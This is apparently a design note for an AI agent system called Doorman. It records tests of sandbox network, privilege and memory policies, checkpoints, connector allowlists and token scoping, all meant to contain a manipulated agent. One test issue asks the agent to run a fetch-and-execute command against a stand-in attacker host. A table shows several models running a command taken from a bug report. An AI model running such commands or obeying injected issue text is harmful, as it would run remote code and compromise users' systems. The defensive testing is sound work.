# Platform

What Doorman relies on from Fly.io Sprites and the connector gateway, each checked on a real Sprite. Measured on 2026-11-24 with Sprite CLI 2026-11-03 and Sprite runtime 0.0.5 (Ubuntu 26.04.1, 8 vCPU, `sbd` storage, Node 24.22.1, npm 12.0.2).

## Worker policies

All three are set from outside the Sprite, with `POST /v1/sprites/{name}/policy/...`, and survive checkpoint restores.

**Network.** Deny by default, then allow the package registries and GitHub:

```json
{
  "rules": [
    { "domain": "registry.npmjs.org", "action": "allow" },
    { "domain": "*.npmjs.org", "action": "allow" },
    { "domain": "registry.yarnpkg.com", "action": "allow" },
    { "domain": "github.com", "action": "allow" },
    { "domain": "codeload.github.com", "action": "allow" },
    { "domain": "*.githubusercontent.com", "action": "allow" },
    { "domain": "*", "action": "deny" }
  ]
}
```

| Inside the worker                            | Result         |
| :------------------------------------------- | :------------- |
| `curl https://registry.npmjs.org/left-pad`   | 200            |
| `getent hosts github.com`                    | resolves       |
| `getent hosts example.com`, `api.openai.com` | blocked at DNS |
| `example.com` after 3 restores               | still blocked  |

The policy takes effect in about 3 s. It is readable from outside with `GET /v1/sprites/{name}/policy/network`; there's no `/.sprite/policy/network.json` inside this runtime.

**Privileges.** `{"profile":"minimal","noNewPrivileges":true}` sets `NoNewPrivs` to 1, and `sudo -n true` is refused. The setting survives restores.

**Memory.** `{"memory":{"limit_mb":2048,"autoscale":false}}` applies only after the Sprite restarts. Before that, `free -m` still shows 16 GB; afterwards it shows 2048 MB, and allocating 4 GB kills the exec session and reboots the worker. So the bootstrap script sets the policy before taking the golden checkpoint, and Doorman treats a dropped exec as `oom`.

## Checkpoints

On a worker with a small overlay:

| Operation                                                       |        Time |
| :-------------------------------------------------------------- | ----------: |
| `sprite checkpoint create`                                      |      0.78 s |
| `sprite restore`, until `exec` sees the restored files (3 runs) | 3.18–3.23 s |

Every restore matched the checkpoint. A worker with a cloned repository and `node_modules` restores more slowly, about as long as a restart on `sbd` storage.

The docs say the last five checkpoints are mounted read-only at `/.sprite/checkpoints/`. In this runtime that directory is empty, so Doorman reads evidence from the repository, not from checkpoint mounts.

## Connectors

The gateway at `https://api.sprites.dev/v1/gateway` stores provider credentials and never returns them. SDKs work by pointing their base URL at it with any placeholder key. API-key connectors are created with `POST /v1/oauth/connections/api_key`; connectors created in the dashboard start with an empty policy, which denies everything.

**Workers can't use them.** From a worker, connector routes fail at DNS because of the network policy. With `api.sprites.dev` allowed for the test, they returned 403 `sprite name must start with 'doorman-home'`. Each layer blocks on its own.

**GitHub.** Policy `name_prefix: doorman-home` plus an endpoint allowlist for the configured repositories:

| Call from `doorman-home`                                 | Result                         |
| :------------------------------------------------------- | :----------------------------- |
| `GET /repos/<owner>/<repo>`, `.../issues`, `/rate_limit` | 200                            |
| `GET /user`, another owner's repository                  | 403, not in the allowed list   |
| `GET .../hooks`, `.../contents/LICENSE`                  | 403, blocked by policy         |
| `GET .../tarball/main`                                   | 302 to a signed `codeload` URL |
| `POST .../labels`                                        | 201                            |

The allowlist needs the exact repository path: `/repos/x/y/*` doesn't match `/repos/x/y`. It matches paths, not methods, so anything readable is also writable; Doorman's own client adds the write restriction.

**Box.** Creating folders, uploading files and uploading new versions work (201, 1 to 2 s); reading returns the latest version. Listing versions and deleting files return 403, so a manipulated agent can't wipe its memory.

**Pinecone.** Listing indexes, `embed`, upsert and search work. Creating an index returns 403, so the `doorman-issues` index (integrated `llama-text-embed-v2`, 1024 dimensions, cosine) is created once from outside. A search for "wrong time after daylight saving change" ranked the DST issue first (score 0.401, next 0.137) in 0.89 s.

**TypeSafe Jev.** An issue asking to run `curl https://attacker.example/x.sh | sh` scored 0.95 on the injection question, and the gate answered `block` with confidence 1.0. Round trip from the Sprite: 0.25 s.

**Ollama Cloud.** Chat needs usage credits on the account (402 without them). With one `run` tool and a DST bug report:

| Model                 | Latency | Tool calls                    |
| :-------------------- | ------: | :---------------------------- |
| `deepseek-v4.1-flash` |   0.6 s | 1, runs the reported command  |
| `gpt-oss:120b`        |   0.7 s | 1, runs the reported command  |
| `kimi-k2.7-code`      |   2.8 s | 1, runs the reported command  |
| `glm-5.3-flash`       |   5.9 s | 3, checks Node and `TZ` first |

## Sprites tokens

Tokens from sprites.dev/account are unrestricted by default: one created a Sprite outside the intended prefix. A Custom API connector can't wrap the Sprites API either (403 `base URL targets the Sprites API itself`), so the Sprite that drives workers holds a Sprites token itself.

The dashboard can restrict a token by single Sprite, name prefix, maximum number of Sprites and expiry. With the prefix `doorman-w-`:

| Call from `doorman-home`                         | Result                        |
| :----------------------------------------------- | :---------------------------- |
| `GET /v1/sprites`                                | 200, lists only `doorman-w-*` |
| `exec` and checkpoints on a `doorman-w-*` Sprite | 200                           |
| `exec` on `doorman-home`                         | 403                           |
| Creating a Sprite outside the prefix             | 403                           |

The restriction also covers existing Sprites, not only new ones. Policies of `doorman-w-*` Sprites can still be changed, so Doorman's client has no policy calls. The token is shown once; write it to the home Sprite with the filesystem API (`PUT /v1/sprites/{name}/fs/write`), because piping it through `sprite exec --stdin` truncated it.
